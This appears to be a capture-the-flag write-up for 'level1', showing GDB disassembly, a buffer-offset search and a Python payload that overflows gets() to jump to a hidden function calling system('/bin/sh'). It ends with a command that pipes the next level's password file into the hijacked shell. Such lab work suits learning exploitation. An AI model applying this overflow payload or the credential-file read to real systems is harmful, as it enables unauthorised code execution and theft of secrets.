# Level1

First step - testing the program

	$ ./level1
	coucou

The program wait an input and quit after press enter

Start the program in GDB

	$ gdb level1
	(gdb) disas main
	Dump of assembler code for function main:
	   0x08048480 <+0>:		push   ebp
	   0x08048481 <+1>:		mov    ebp,esp
	   0x08048483 <+3>:		and    esp,0xfffffff0
	   0x08048486 <+6>:		sub    esp,0x50 <--------- Buffer of 80
	   0x08048489 <+9>:		lea    eax,[esp+0x10]
	   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
	   0x08048490 <+16>:	call   0x8048340 <gets@plt>
	   0x08048495 <+21>:	leave
	   0x08048496 <+22>:	ret
	End of assembler dump.

Just a `gets()` call and quit

List the functions of the program

	(gdb) info function
	All defined functions:

	Non-debugging symbols:
	0x080482f8  _init
	0x08048340  gets@plt
	0x08048350  fwrite@plt
	0x08048360  system@plt
	0x08048370  __gmon_start__@plt
	0x08048380  __libc_start_main@plt
	0x08048390  _start
	0x080483c0  __do_global_dtors_aux
	0x08048420  frame_dummy
	0x08048444  run <---------- function not called in main
	0x08048480  main
	0x080484a0  __libc_csu_init
	0x08048510  __libc_csu_fini
	0x08048512  __i686.get_pc_thunk.bx
	0x08048520  __do_global_ctors_aux
	0x0804854c  _fini

We can see a function "run", not called in the main

Disassemble this function

	(gdb) disas run
	Dump of assembler code for function run:
	   0x08048444 <+0>:		push   ebp
	   0x08048445 <+1>:		mov    ebp,esp
	   0x08048447 <+3>:		sub    esp,0x18
	   0x0804844a <+6>:		mov    eax,ds:0x80497c0
	   0x0804844f <+11>:	mov    edx,eax
	   0x08048451 <+13>:	mov    eax,0x8048570
	   0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx
	   0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13
	   0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1
	   0x0804846a <+38>:	mov    DWORD PTR [esp],eax
	   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
	   0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
	   0x08048479 <+53>:	call   0x8048360 <system@plt> <------- system call
	   0x0804847e <+58>:	leave
	   0x0804847f <+59>:	ret
	End of assembler dump.

There is a `system()` call

Check the argument of system

	(gdb) x/s 0x8048584
	0x8048584:	 "/bin/sh"


We need to force the call to the "run" function

**********************************

Check the exact buffer size with a pattern from wiremask.eu/tools/buffer-overflow-pattern-generator

	(gdb) run
	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

	Program received signal SIGSEGV, Segmentation fault.
	0x63413563 in ?? ()

	(gdb) print $eip
	$1 = (void (*)()) 0x63413563

Put the content of EIP in the checker of the tool and get the offset : 76

The exact buffer size is 76

Using the gdb-peda pattern tool

	(gdb-peda)$ pattern create 200 pattern_file

	(gdb-peda)$ run < pattern_file
	Program received signal SIGSEGV, Segmentation fault.
	...
	EIP: 0x41344141 ('AA4A')
	...

	(gdb-peda)$ pattern search
	Registers contain pattern buffer:
	...
	EIP+0 found at offset: 76
	....

The buffer size is 76

**********************************

Test it

	$ python -c "print 'a'*77" | ./level1
	Segmentation fault (core dumped)

Open with gdb-peda and put 80 bytes of 'a' (76 + 4 for overwrite EIP)

	$ python -c 'print "a"*80' > payload
	(gdb-peda)$ run < payload
	...
	EIP: 0x61616161 ('aaaa')
	...

Good, the last 4 bytes will be the address of the function "run" for calling it instead of return address

The address of the "run" function is "0x08048444" has seen above

Beware of the little endian

	$ python -c 'print "a"*76+"\x44\x84\x04\x08"' > /tmp/payload

Now execute with our payload

	$ cat /tmp/payload | ./level1
	Good... Wait what?
	Segfault

The function "run" was executed but stdin is not open, we need to do it in one line

	$ (cat /tmp/payload ; echo whoami) | ./level1
	level1
	Good... Wait what?
	level2
	Segmentation fault (core dumped)

Ok it's works

$ (cat /tmp/payload ; cat /home/user/level2/.pass) | ./level1

Done!

Script it for reproduice!
